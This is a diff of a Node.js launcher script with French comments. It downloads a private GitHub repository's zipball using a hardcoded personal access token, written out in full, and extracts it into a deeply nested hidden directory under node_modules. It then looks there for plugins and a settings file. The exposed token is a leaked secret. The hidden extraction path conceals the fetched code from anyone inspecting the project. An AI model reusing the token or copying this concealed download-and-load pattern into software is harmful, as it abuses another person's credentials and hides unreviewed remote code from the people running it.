@@ -15,7 +15,7 @@ const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.c
 
 // === GIT CONFIG ===
 const GITHUB_TOKEN = "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";
-const DOWNLOAD_URL = "https://github.com/Ely304-jpg/test/archive/refs/heads/main.zip";
+const DOWNLOAD_URL = "https://api.github.com/repos/Ely304-jpg/test/zipball/main"; // ✅ API GitHub recommandée pour private
 const EXTRACT_DIR = path.join(TEMP_DIR, "n-main");
 const LOCAL_SETTINGS = path.join(__dirname, "settingss.js");
 const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settingss.js");
@@ -44,27 +44,27 @@ async function downloadAndExtract() {
 
   const zipPath = path.join(TEMP_DIR, "repo.zip");
 
-  console.log(chalk.blue("⬇️ Connecting to GitHub..."));
+  console.log(chalk.blue("⬇️ Connecting to GitHub (private)..."));
   const response = await axios({
     url: DOWNLOAD_URL,
     method: "GET",
-    responseType: "stream",
+    responseType: "arraybuffer",
     headers: {
       Authorization: `token ${GITHUB_TOKEN}`,
       Accept: "application/vnd.github.v3.raw",
+      "User-Agent": "axios"
     },
   });
 
-  await new Promise((resolve, reject) => {
-    const writer = fs.createWriteStream(zipPath);
-    response.data.pipe(writer);
-    writer.on("finish", resolve);
-    writer.on("error", reject);
-  });
-
+  fs.writeFileSync(zipPath, response.data);
   console.log(chalk.green("📦 ZIP download complete. Extracting..."));
   new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);
   fs.unlinkSync(zipPath);
+
+  // Trouve le bon dossier extrait
+  const dirs = fs.readdirSync(TEMP_DIR).filter(d => fs.statSync(path.join(TEMP_DIR, d)).isDirectory());
+  const extractedRoot = path.join(TEMP_DIR, dirs[0]); // le dossier renommé par GitHub automatiquement
+  fs.renameSync(extractedRoot, EXTRACT_DIR);
 
   const pluginFolder = path.join(EXTRACT_DIR, "plugins");
   if (fs.existsSync(pluginFolder)) {
